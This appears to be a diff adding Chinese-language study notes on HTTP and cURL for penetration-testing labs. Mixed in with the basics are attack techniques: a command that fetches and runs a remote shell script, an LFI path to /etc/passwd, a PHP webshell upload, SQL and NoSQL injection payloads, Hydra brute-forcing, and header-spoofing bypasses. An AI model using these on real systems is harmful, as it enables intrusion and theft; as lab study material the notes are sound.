@@ -1,0 +1,478 @@
+[HTTP 核心觀念]
+1. 通訊架構：Client-Server（請求/回應機制）。
+2. 預設端口：HTTP 為 80；HTTPS 為 443。
+3. 域名解析流程：輸入域名 -> 查本地 /etc/hosts -> 查 DNS Server 拿 IP -> 往目標 IP:Port 送出 HTTP 請求 -> 伺服器回傳狀態碼 (如 200 OK) 與網頁內容。
+
+[URL 結構組成]
+scheme://[user:pass@]host[:port]/path[?query][#fragment]
+- scheme: 通訊協定 (http, https)
+- user:pass: 身份驗證憑證 (選填)
+- host: 域名或 IP 位址
+- port: 通訊埠 (選填，未填則走協定預設值)
+- path: 目標資源檔案路徑 (例如 index.html, dashboard.php)
+- query string: 參數鍵值對，以 '?' 開頭，多個參數用 '&' 連接
+- fragment: 網頁內部錨點，以 '#' 開頭，只在前端生效
+
+[cURL 常用參數]
+- 基本請求：curl http://<TARGET>
+- 下載並另存新檔名：curl -o <filename> <URL>
+- 依伺服器檔名直接下載：curl -O <URL>
+- 靜音模式 (隱藏進度條)：curl -s <URL>
+- 靜音並儲存：curl -s -O <URL>
+- 查看 HTTP 回應標頭 (Header)：curl -i <URL>
+- 僅查看回應標頭：curl -I <URL>
+- 發送 POST 請求帶資料：curl -d "param=value" <URL>
+- 自訂 User-Agent：curl -A "Mozilla/5.0" <URL>
+- 查看詳細連線除錯資訊：curl -v <URL>
+
+
+--------------------------------------
+
+1. 綁定靶機虛擬主機（Virtual Host）
+- 靶機通常只給 IP，但很多網站採用基於域名的虛擬主機配置。
+- 如果直接打 IP 會顯示 404 或 Apache 預設頁，你必須把靶機的域名（如 inlanefreight.htb）手動寫進本地的 /etc/hosts，才能正常載入頁面。
+
+2. 辨識與繞過非標準 Port
+- 很多靶機的 Web 服務不會開在 80/443，而是開在 8080、8000、8888、5000 等特殊端口。
+- 看到 Nmap 掃出特殊 Port 時，URL 就必須手動加後綴（如 http://10.10.11.x:8080）。
+
+3. 尋找與竄改 URL Query 參數（常見漏洞點）
+- 看到 ?id=1、?page=home.php、?file=test.txt 時：
+  * SQL 注入（SQLi）：修改參數測試報錯與撈資料。
+  * 本地文件包含（LFI）：改成 ?file=../../../../etc/passwd 讀取系統敏感檔案。
+  * 越權訪問（IDOR）：把 ?user_id=2 改成 ?user_id=1 存取管理員資料。
+
+4. 活用 cURL 進行快速滲透與腳本化
+- 快速撈源碼：很多前端會用 JS 鎖右鍵防檢查，用 curl 可以在終端機秒看 HTML 原始碼，快速翻 HTML 註釋或隱藏路徑。
+- 繞過前端限制：前端網頁表單限制了輸入字數或按鈕被 disabled，直接用 curl -d 帶 payload 送 POST 請求繞過。
+- 傳送反彈 Shell 腳本：當你拿到靶機命令執行權限（RCE）時，常用 curl http://你的IP/shell.sh | bash 直接讓靶機下載並執行你的後門。
+- 批次爆破/探測：搭配 Bash loop 或 wfuzz/ffuf，用類似 cURL 的語法大量測試未授權目錄或 API 端點。
+
+
+----------------------------------------------
+
+[HTTPS 核心概念]
+1. 定義：HTTP + SSL/TLS 加密層，防止傳輸內容被中間人竊聽或篡改。
+2. 預設通訊埠 (Port)：HTTPS 為 443；HTTP 為 80。
+3. 傳輸對比：
+   - HTTP：Wireshark 側錄可直接看見帳號、密碼、Cookie 等明文資料。
+   - HTTPS：流量在傳輸層即加密，封包側錄僅能看見亂碼 (Application Data)。
+4. 重定向流程：
+   - 使用者在瀏覽器輸入 http:// -> 伺服器回傳 301/302 重定向到 https:// -> 建立 TLS 交握 -> 進入加密通訊。
+
+[cURL 在 HTTPS 下的必備指令]
+- 基本 HTTPS 請求：
+  curl https://<TARGET>
+
+- 忽略 SSL 憑證無效報錯 (極重要)：
+  curl -k https://<TARGET>
+  (或使用完整參數 curl --insecure https://<TARGET>)
+
+- 跟隨 301/302 重定向 (自動跳轉至 HTTPS)：
+  curl -L http://<TARGET>
+
+- 查看詳細 SSL/TLS 交握過程 (Debug / 憑證分析)：
+  curl -v -k https://<TARGET>
+
+-------------------------------
+1. 靶機使用自簽證書（Self-Signed Certificate）
+- 靶機 Web 伺服器（Port 443 或 8443）通常沒有花錢買正式憑證，而是隨便自簽一張。
+- 只要你用 cURL、Python Requests 或其他工具發送請求，程式一定會預設報錯中斷（SSL certificate error）。
+- 解決方法：打靶只要碰到 HTTPS，cURL 起手式一律帶 -k（例：curl -k https://靶機IP），忽略憑證驗證。
+
+2. 從憑證洩漏中「收集子域名與靶機真實主機名」
+- 很多靶機做虛擬主機（vhost）綁定，直接打 IP 會被擋或導向預設頁。
+- 但靶機掛的 SSL 憑證裡面，常常會大方寫出內部域名（Subject Alternative Name / Common Name，例如 dev.internal.htb）。
+- 你可以用 curl -v -k https://靶機IP 或 openssl s_client 抓取憑證內容，直接拿到未公開的子域名，再把它填進 /etc/hosts 突破限制。
+
+3. HTTP 降級攻擊（SSL Stripping / 中間人攻擊）
+- 在內網滲透情境中，如果使用者透過未加密的 HTTP 連線，攻擊者可以攔截請求並阻止其升級為 HTTPS，藉此維持明文連線並直接側錄機敏資料與帳密。
+
+4. 代理攔包工具（Burp Suite）的憑證信任
+- 當你用 Burp Suite 作為中繼代理攔截靶機流量時，Burp 會用自己的 CA 簽發臨時憑證。
+- 如果終端機工具（如 cURL、ffuf、sqlmap）不加上 -k / --insecure，工具會認定 Burp 憑證不可信而整批請求失敗。
+
+--------------------------------------
+
+[HTTP 請求結構 (Request)]
+1. 請求行 (Request Line)：
+   - Method (方法，如 GET, POST)
+   - Path (資源路徑與參數，如 /login.php?user=admin)
+   - HTTP Version (協定版本，如 HTTP/1.1)
+2. 請求標頭 (Headers，鍵值對)：
+   - Host: 目標主機域名 (虛擬主機路由必備)
+   - User-Agent: 客戶端/瀏覽器/掃描器識別字串
+   - Cookie: 客戶端攜帶的 Session 憑證或狀態
+   - Content-Type: 告知伺服器 Body 資料格式
+3. 空行 (CRLF)：分隔標頭與資料正文
+4. 資料正文 (Body)：POST 提交的帳密、表單或 JSON (GET 請求通常無 Body)
+
+[HTTP 回應結構 (Response)]
+1. 狀態行 (Status Line)：
+   - HTTP Version (如 HTTP/1.1)
+   - Status Code (狀態碼，如 200, 301, 401, 404, 500)
+   - Status Text (如 OK, Unauthorized, Not Found)
+2. 回應標頭 (Headers)：
+   - Server: 伺服器軟體版本 (指紋識別重要依據，如 Apache/2.4.41)
+   - Set-Cookie: 伺服器核發給瀏覽器的 Cookie
+   - Content-Type: 回傳內容格式 (如 text/html, application/json)
+3. 空行 (CRLF)
+4. 回應正文 (Response Body)：網頁原始碼 (HTML/JS)、下載檔案或 API JSON
+
+[除錯與觀測指令]
+- cURL 詳細模式 (顯示 Request > 與 Response < 標頭)：
+  curl -v http://<TARGET>
+- cURL 超詳細模式 (包含底層 TLS/網路狀態)：
+  curl -vvv http://<TARGET>
+- 瀏覽器檢測：按 F12 開啟 DevTools -> 切換至 Network (網路) 分頁 -> 重新整理頁面 (F5) 監控所有 HTTP 流量
+------------------------------------------------
+1. 資訊收集與伺服器指紋識別 (Banner Grabbing)
+- 靶機剛開好，跑 curl -I 或 curl -v 看 Response Header 的 Server 欄位。
+- 若看見舊版本 (例如 Apache 2.4.49 或 PHP 8.1.0-dev)，可以直接去查對應的已知 CVE (如目錄遍歷或後門 RCE)，免去盲目猜測。
+
+2. 偽造與繞過身份驗證 (Session Hijacking & Header Spoofing)
+- 抓包查看 Request 的 Cookie 或 Authorization Header。
+- 當你打下低權限帳號拿到 Session ID 後，可以直接修改 Cookie 偽裝登入，或透過改寫 X-Forwarded-For: 127.0.0.1 偽裝成本機管理員繞過 IP 白名單。
+
+3. 繞過 WAF 與 User-Agent 限制
+- 某些靶機或防火牆會封鎖 cURL、Python 或 sqlmap 的預設 User-Agent (回傳 403 Forbidden)。
+- 打靶時可用 curl -A "Mozilla/5.0..." 偽裝成合法 Chrome 瀏覽器繞過攔截。
+
+4. 挖掘敏感路徑與隱藏 API
+- 按 F12 觀察 Network 流量，有些現代網頁會非同步 (AJAX/Fetch) 載入後端 API (例如 /api/v1/users)。
+- 這些 API 端點在前端畫面上看不到，但在 DevTools 的 Network 標籤頁抓得一清二楚，往往藏有未授權存取或 IDOR 漏洞。
+
+
+-------------------------------------
+
+[HTTP 標頭分類與關鍵欄位]
+
+1. 總標頭 (General Headers)
+- Connection: close (請求完立即斷開連線) / keep-alive (保持長連線)
+- Cache-Control: no-store / no-cache (指示瀏覽器或代理不要快取敏感內容)
+
+2. 實體標頭 (Entity / Representation Headers)
+- Content-Type: 資料 MIME 類型 (如 text/html, application/json, multipart/form-data)
+- Content-Length: 資料本體大小 (位元組長度)
+- Content-Encoding: 壓縮格式 (如 gzip, deflate)
+
+3. 請求標頭 (Request Headers)
+- Host: 目標主機域名 (虛擬主機路由依據)
+- User-Agent: 客戶端環境/瀏覽器指紋
+- Referer: 發起請求的來源 URL (常被用作未授權訪問的防禦檢查)
+- Cookie: 客戶端持有的 Session/身份識別資訊
+- Authorization: 認證憑證 (如 Basic Base64 編碼帳密、Bearer Token)
+- X-Forwarded-For: 記錄客戶端真實 IP (透過反向代理時)
+
+4. 回應標頭 (Response Headers)
+- Server: 伺服器軟體與版本資訊 (指紋識別依據)
+- Set-Cookie: 伺服器向客戶端設定 Cookie (包含 Secure, HttpOnly, SameSite 屬性)
+- Location: 301/302 重定向目標網址
+- WWW-Authenticate: 告知需出示 401 認證方式
+
+5. 安全標頭 (Security Headers)
+- Content-Security-Policy (CSP): 限制資源載入來源，防禦 XSS
+- Strict-Transport-Security (HSTS): 強制瀏覽器僅使用 HTTPS 連線
+- X-Frame-Options: DENY / SAMEORIGIN，防禦點擊劫持 (Clickjacking)
+- Access-Control-Allow-Origin: CORS 跨域資源共享白名單
+
+[cURL 標頭相關指令]
+- 僅查看回應標頭 (HEAD 請求)：curl -I <URL>
+- 顯示回應標頭 + 回應正文：curl -i <URL>
+- 自訂發送任意標頭：curl -H "Header-Name: value" <URL>
+- 自訂發送 User-Agent：curl -A "Mozilla/5.0" <URL>
+- 偽造客戶端 IP：curl -H "X-Forwarded-For: 127.0.0.1" <URL>
+-----------------------------
+
+1. 偽造 X-Forwarded-For 繞過內網 IP 限制 (Header 欺騙)
+- 靶機的管理員後台常限制「只允許本機 (127.0.0.1) 或內部網段登入」，直接連線會回傳 403 Forbidden。
+- 滲透時用 cURL 帶上自訂標頭：
+  curl -H "X-Forwarded-For: 127.0.0.1" http://靶機IP/admin
+  後端若只相信代理標頭，就會誤以為你是從本機連進去的管理員，直接放行。
+
+2. 偽造 Referer 繞過防盜鏈或 CSRF 驗證
+- 某些敏感檔案下載或特定頁面要求「必須先從 /index.php 點過來才能看」，直接打 URL 會被擋。
+- 測試時加上 Referer 偽造來源：
+  curl -H "Referer: http://靶機IP/index.php" http://靶機IP/secret.php
+
+3. 繞過 WAF 阻擋 (偽裝 User-Agent)
+- 當你用預設 cURL、Python 或自動化掃描器打靶時，常會因為 User-Agent 包含 curl/7.x 或 python-requests 而被伺服器阻擋。
+- 只要加上合法瀏覽器標頭就能順利通行：
+  curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36" http://靶機IP
+
+4. 檢查 Set-Cookie 安全屬性 (提取 Session 劫持利用點)
+- 用 curl -I 檢查伺服器回傳的 Set-Cookie 標頭：
+  * 若缺少 HttpOnly：代表該站只要有 XSS 漏洞，攻擊者就可以直接用 document.cookie 偷走管理員的 Session。
+  * 若缺少 Secure：代表 Session 可以在明文 HTTP 傳輸，容易在內網被中間人側錄。
+
+5. 審查 CSP 與 X-Frame-Options 尋找前端漏洞
+- 看到 X-Frame-Options 缺失或未設定為 DENY：代表可以做點擊劫持（把該頁面用 <iframe> 嵌入攻擊者惡意網站騙取點擊）。
+- 看到 Content-Security-Policy (CSP) 設置過於寬鬆（如使用了 'unsafe-inline' 或引用了不安全的 CDN）：代表可以構造繞過規則成功觸發 XSS 攻擊。
+
+------------------------------------------
+
+[1. Network 請求路徑與 API 端點]
+搜尋位置：Network 分頁的 Filter (篩選框) 或 URL 路徑
+
+- 管理與特權端點：
+  admin, root, dashboard, manage, console, panel, portal, setting, config
+- 敏感資料與身分驗證：
+  api, v1, v2, auth, login, user, account, profile, session, token, jwt
+- 檔案操作與傳輸：
+  download, export, upload, file, fetch, view, doc, report
+- 測試與除錯端點：
+  test, debug, dev, staging, backup, old, temp, log, status
+- CTF/靶機專用：
+  flag, secret, key, hidden, ctf, challenge
+
+[2. JavaScript 與原始碼敏感字串]
+搜尋位置：DevTools 按 Ctrl + Shift + F 進行全域程式碼搜尋 (Search)
+
+- 憑證與金鑰硬編碼：
+  api_key, apikey, secret, private_key, access_token, bearer, authorization
+- 密碼與帳號欄位：
+  password, passwd, pwd, username, user_id, credential
+- 內部服務與網路路徑：
+  localhost, 127.0.0.1, internal, http://, https://, /api/
+- 敏感註解與除錯標記：
+  TODO, FIXME, NOTE, DEBUG, HACK, admin_only
+
+[3. HTTP 標頭重點欄位 (Headers)]
+搜尋位置：點選特定請求 -> Headers 標籤頁
+
+- 身分與權限判定：
+  Cookie, Authorization, X-Forwarded-For, X-Real-IP, Referer
+- 伺服器指紋與技術棧：
+  Server, X-Powered-By, X-AspNet-Version
+- 跨域與安全性策略：
+  Access-Control-Allow-Origin, Content-Security-Policy, X-Frame-Options
+
+[4. 回應內容資料格式 (Response)]
+搜尋位置：篩選 Fetch/XHR 請求 -> 查看 Response / Preview
+
+- 敏感格式：
+  json, xml, jwt (開頭通常為 eyJ...)
+- 狀態指示：
+  error, exception, stack trace, unauthorized, forbidden, success: false
+
+
+------------------------------------------
+
+[HTTP 常用方法 (Methods)]
+- GET    : 讀取資源，參數接在 URL 後面 (?id=1)，不應改變伺服器狀態。
+- POST   : 提交資料 (表單、帳密、JSON)，資料放於 Body，具破壞性/變更性。
+- HEAD   : 僅請求回應標頭 (Headers)，不回傳 Body，用於探測檔案存在與大小。
+- PUT    : 上傳/替換伺服器上的指定資源 (整筆覆蓋)。
+- PATCH  : 部分更新指定資源。
+- DELETE : 請求伺服器刪除指定資源。
+- OPTIONS: 查詢目標 URL 支援哪些 HTTP 方法 (偵察必備)。
+
+[HTTP 狀態碼五大分類 (Status Codes)]
+- 1xx (Informational) : 資訊提示，請求進行中。
+- 2xx (Success)       : 請求成功處理 (例: 200 OK, 201 Created)。
+- 3xx (Redirection)   : 重新導向 (例: 301 永久重定向, 302 暫時重定向)。
+- 4xx (Client Error)  : 客戶端錯誤 (例: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)。
+- 5xx (Server Error)  : 伺服器端錯誤 (例: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable)。
+
+[打靶必備常用 cURL 參數]
+- 指定 HTTP 方法：curl -X POST http://<TARGET>
+- 發送 OPTIONS 探測：curl -X OPTIONS -i http://<TARGET>
+- 發送 PUT 嘗試上傳檔案：curl -X PUT -d @shell.php http://<TARGET>/shell.php
+- 發送 DELETE 請求：curl -X DELETE http://<TARGET>/user/1
+
+-----------------------------------------
+
+1. 利用 OPTIONS 探測危險方法 (WebDAV 漏洞)
+- 當你打靶遇到一台伺服器，起手式用 curl -X OPTIONS -i http://靶機IP。
+- 若伺服器回傳 Allow: GET, POST, OPTIONS, PUT, DELETE：
+  代表該站可能開啟了未授權的 WebDAV！你可以直接用 curl -X PUT 把一句話木馬 (shell.php) 上傳上去直接拿到 RCE。
+
+2. 透過 500 錯誤挖 SQLi 與程式碼崩潰 (Error-based)
+- 在登入框或參數輸入單引號 ' 或特殊字符。
+- 如果原本是 200 OK，輸入特殊符號後變成 500 Internal Server Error，代表伺服器後端程式碼炸裂了。
+- 這通常是 SQL 注入 (SQLi)、後端反序列化或邏輯漏洞的重大信號。
+
+3. 監控 302 轉跳與繞過身分驗證
+- 訪問管理員頁面 /admin 時，伺服器常回傳 302 Found 叫你滾去 /login.php。
+- 很多不嚴謹的開發者在寫 PHP 時，只寫了 header("Location: login.php"); 卻忘了在後面加 exit;。
+- 當你用 curl http://靶機IP/admin (不要加 -L 跟隨重定向) 時，你會驚訝地發現後台頁面的 HTML 其實早就全部回傳在 302 的封包 Body 裡了，直接繞過登入！
+
+4. API 測試與 HTTP 動詞篡改 (Verb Tampering)
+- 靶機的 WAF 或存取控制規則可能只擋了 GET /admin (回傳 403 Forbidden)。
+- 但如果你把請求方法改成 POST、PUT 或是 HEAD (例如 curl -X POST http://靶機IP/admin)，後端驗證規則被繞過，可能直接放行存取後台。
+
+
+-----------------------------------------
+
+[HTTP 基本驗證 (Basic Auth) 流程與機制]
+1. 未認證請求：Client 發起請求 -> Server 回應 401 Unauthorized 並帶上標頭 WWW-Authenticate: Basic realm="名稱"。
+2. 憑證結構：將 "使用者名稱:密碼" 進行 Base64 編碼。
+   例如：admin:admin -> YWRtaW46YWRtaW4=
+3. 攜帶認證送出：Client 在請求標頭加入 Authorization: Basic <Base64字串>，驗證成功則回應 200 OK。
+4. 安全風險：Base64 為公開演算法可任意雙向還原，若未在 HTTPS 下傳輸等同明文傳送帳密。
+
+[cURL 帶帳密驗證語法]
+- 參數法 (-u)：
+  curl -u "admin:admin" http://<TARGET>/
+- URL 內嵌法：
+  curl http://admin:admin@<TARGET>/
+- 手動塞入 Header 法：
+  curl -H "Authorization: Basic YWRtaW46YWRtaW4=" http://<TARGET>/
+
+[瀏覽器 Network 神技：Copy as cURL]
+1. 按 F12 -> 切換至 Network (網路) 分頁。
+2. 在網頁進行操作 (如搜尋、輸入文字觸發 API)。
+3. 在 Network 清單中找到目標請求 -> 按右鍵 -> Copy -> Copy as cURL。
+4. 貼到本機終端機 (CMD / Bash) 即可 100% 重現該請求。
+
+-------------------------------------
+
+1. 爆破 Basic Auth 帳密 (Hydra / cURL 腳本)
+- 碰到跳出瀏覽器原生彈窗的頁面（401 Unauthorized），就是 Basic Auth。
+- 可以直接用 Hydra 字典檔爆破：
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt 靶機IP http-get /
+- 或用 Bash/Python 寫迴圈將帳密組 Base64 後塞進 Authorization Header 批次探測。
+
+2. 從封包側錄中秒解帳密
+- 若靶機情境是流量分析 (Wireshark / PCAP 題)，發現目標走 HTTP 且 Header 帶有：
+  Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
+- 直接將該字串丟進終端機解碼，帳密直接到手：
+  echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
+
+3. 利用「Copy as cURL」重現複雜 API 進行 SQLi / 命令注入 (重點中的重點)
+- 很多靶機的搜尋框或後台功能，背後牽涉到極為複雜的 Session Cookie、CSRF Token 與自訂 Header。
+- 如果手動用 cURL 或 Python 刻請求很容易漏掉欄位導致報錯 403。
+- 最快打法：瀏覽器按 F12 -> 觸發搜尋功能 -> 右鍵 Copy as cURL -> 貼進終端機。
+- 接著直接在終端機把參數改成注入 Payload (例如改成 ?search=' OR 1=1--)，秒測漏洞！
+
+4. 將請求無縫丟入 sqlmap 自動化注入
+- 用瀏覽器 Network 找到帶參數的 GET 請求後，複製完整 URL 與 Authorization 標頭：
+  sqlmap -u "http://靶機IP/search.php?search=le" --headers="Authorization: Basic YWRtaW46YWRtaW4=" --dbs
+- 即可直接讓 sqlmap 自動把資料庫整庫脫出。
+
+-------------------------------
+
+遇到問題時，問自己這 3 個問題：
+
+1. 「網頁正常點擊、要找線索」
+   👉 去哪裡？【瀏覽器 + F12 (Network / Console)】
+   👉 做什麼？重新整理，看背景有沒有偷偷跑出什麼 API 或請求。
+
+2. 「題目叫你偽造標頭、帶特殊參數、或是要跳過前端防護」
+   👉 去哪裡？【黑色視窗 CMD / 終端機】
+   👉 做什麼？用 curl.exe 發請求。
+
+3. 「在 CMD 裡打指令到底要打什麼」
+   👉 規則只有一個：curl.exe [身分/參數] "完整網址路徑"
+   - 要帶帳密？加 -u admin:admin
+   - 要改參數？網址後面接 ?search=flag
+   - 網址一律用雙引號 " " 包起來，才不會被 Windows 誤判
+
+-----------------------------
+[GET 與 POST 的核心差異]
+1. GET：
+   - 參數帶在 URL 後方 (?key=val)
+   - 容易被瀏覽器紀錄、Proxy、Server Access Log 側錄敏感資訊
+   - 長度受限於 URL 規範 (通常 2000 字元以內)
+2. POST：
+   - 參數放在 HTTP Body 正文中傳遞
+   - 伺服器 Log 預設不會記錄 Body，安全性較高
+   - 可傳輸大量資料、二進位檔案 (如圖片、PDF)
+
+[Cookie 與 Session 認證機制]
+1. 登入：Client 發送 POST /login 帶帳密 -> Server 驗證成功回傳 Set-Cookie: PHPSESSID=<Token>
+2. 授權訪問：Client 後續所有請求帶上 Cookie: PHPSESSID=<Token> -> Server 識別身份並授權
+3. 安全隱患：只要攻擊者拿到有效的 Session Cookie，即可免帳密直接偽裝登入 (Session 劫持)
+
+[cURL 必背指令：POST、Cookie 與 JSON]
+
+1. 發送標準 POST 表單資料 (-d)：
+   curl -X POST -d "username=admin&password=admin" http://<TARGET>/login.php
+
+2. 發送 POST 請求並接收伺服器派發的 Cookie (-i 查看 Header)：
+   curl -i -X POST -d "username=admin&password=admin" http://<TARGET>/login.php
+
+3. 帶著登入後的 Cookie 存取受保護頁面 (-b)：
+   curl -b "PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1" http://<TARGET>/dashboard.php
+
+4. 發送 JSON 格式的 POST 請求 (需同時指定 Content-Type 與 Body)：
+   curl -X POST -H "Content-Type: application/json" -b "PHPSESSID=xxxx" -d '{"search":"London"}' http://<TARGET>/search.php
+
+5. Windows CMD 專用 (注意雙引號與跳脫)：
+   curl.exe -X POST -H "Content-Type: application/json" -b "PHPSESSID=xxxx" -d "{\"search\":\"London\"}" http://<TARGET>/search.php
+
+---------------------------
+
+1. 爆破登入表單 (Brute-force Login)
+- 遇到網頁登入表單（非 Basic Auth 彈窗），按 F12 -> Network 攔截登入時的 POST 封包[cite: 42]。
+- 抓出它是傳遞哪兩個參數（例如 username=admin&password=admin）[cite: 42]。
+- 隨後丟進 Hydra 或 Burp Suite Intruder 針對 POST Body 大量測試弱密碼字典：
+  hydra -l admin -P rockyou.txt 靶機IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid"
+
+2. Session 劫持與 Pass-the-Cookie
+- 當你利用 XSS 漏洞偷到了管理員的 Cookie，或者在伺服器目錄翻到 PHP 的 session 暫存檔（/var/lib/php/sessions/sess_xxxx）。
+- 你完全不需要去逆推密碼，直接在瀏覽器按 F12 -> Storage / Application -> Cookies，把這串值貼進去[cite: 44]；或者終端機直接帶 -b "PHPSESSID=偷來的值"[cite: 44]，一秒登入管理員後台[cite: 44, 45]。
+
+3. 測試 JSON API 注入漏洞 (SQLi / NoSQLi / 命令注入)
+- 許多靶機使用現代 Web 架構，前端搜尋框或操作直接傳送 JSON[cite: 45]。
+- 如果直接在前端網頁打單引號 ' 會被前端限制長度或直接報錯阻擋。
+- 技巧：直接用 cURL 構造 JSON Payload 繞過前端檢查，例如將 {"search":"London"} 改成：
+  {"search":"' UNION SELECT 1,group_concat(password) FROM users-- -"}
+  或者針對 MongoDB 的 NoSQL 注入：
+  {"username":"admin", "password":{"$gt":""}}
+
+4. 檢查 Content-Type 繞過 (API 語法變更)
+- 某些後端伺服器對一般的 x-www-form-urlencoded 表單有防護規則（WAF 會擋），但如果把 Content-Type 改成 application/json[cite: 45, 46]，WAF 可能不會去檢查 JSON 內容，導致後端直接解析內部的惡意 Payload。
+
+-------------------------------
+[CRUD 與 HTTP 方法對照表]
+- Create (新增) : POST    -> 傳送 JSON 建立新筆數 (需帶 Content-Type: application/json)
+- Read   (讀取) : GET     -> 取得指定或全部資料 (無 Body)
+- Update (更新) : PUT     -> 替換或更新指定資源的欄位
+- Delete (刪除) : DELETE  -> 刪除指定的資源行
+
+[cURL 操作 CRUD 範例指令]
+
+1. 讀取 (Read - GET)
+- 讀取單筆：
+  curl http://<TARGET>/api.php/city/London
+- 讀取全部 (留空搜尋)：
+  curl http://<TARGET>/api.php/city/
+
+2. 新增 (Create - POST)
+  curl -X POST http://<TARGET>/api.php/city/ -H "Content-Type: application/json" -d '{"city_name":"HTB_City", "country_name":"HTB"}'
+
+3. 更新 (Update - PUT)
+  curl -X PUT http://<TARGET>/api.php/city/London -H "Content-Type: application/json" -d '{"city_name":"New_City", "country_name":"HTB"}'
+
+4. 刪除 (Delete - DELETE)
+  curl -X DELETE http://<TARGET>/api.php/city/New_City
+
+[Windows CMD 注意事項]
+- 傳送 JSON 資料時，CMD 不支援單引號，需使用跳脫雙引號：
+  curl.exe -X POST "http://<TARGET>/api.php/city/" -H "Content-Type: application/json" -d "{\"city_name\":\"HTB_City\",\"country_name\":\"HTB\"}"
+
+
+--------------------------------------
+
+1. 未授權的敏感動作 (Broken Access Control)
+- 靶機前端畫面可能只提供「查詢城市（GET）」的功能給一般使用者，完全沒有做「修改」或「刪除」的按鈕。
+- 但因為後端 API 寫太隨便，沒有做身份權限驗證，攻擊者直接在終端機送 PUT 或 DELETE 請求：
+  curl -X DELETE http://靶機IP/api/users/1
+  結果伺服器真的把管理員帳號給刪了，或用 PUT 直接竄改了別人的密碼。
+
+2. 任意檔案上傳 / 覆蓋 (WebDAV / REST PUT)
+- 遇到某些 API 允許以 PUT 上傳資源時，直接嘗試上傳 Webshell：
+  curl -X PUT http://靶機IP/api/files/shell.php -d "<?php system($_GET['cmd']); ?>"
+  如果成功回傳 201 Created 或 200 OK，就直接拿下了伺服器權限。
+
+3. 動詞篡改繞過 (HTTP Verb Tampering)
+- 伺服器 WAF 或安全規則可能只設定阻擋：
+  "如果方法是 POST 且路徑是 /api/admin，則回傳 403 Forbidden"
+- 這時攻擊者把方法改成 PUT 或 PATCH：
+  curl -X PUT http://靶機IP/api/admin -d '{"role":"admin"}'
+  WAF 沒對 PUT 設防，後端又共用了相同的處理函數，進而直接完成越權。
+
+4. 透過 GET /api/ 列出全部未公開資料
+- 很多時候前端搜尋框必須輸入精確名稱才能撈到資料。
+- 但如果直接對 API 根目錄送 GET 請求（例如 GET /api/users/ 或 GET /api/city/），後端常會不加過濾地一口氣把整張資料庫表格的所有內容（包含內部帳號、密碼雜湊值）全部打包噴出來。
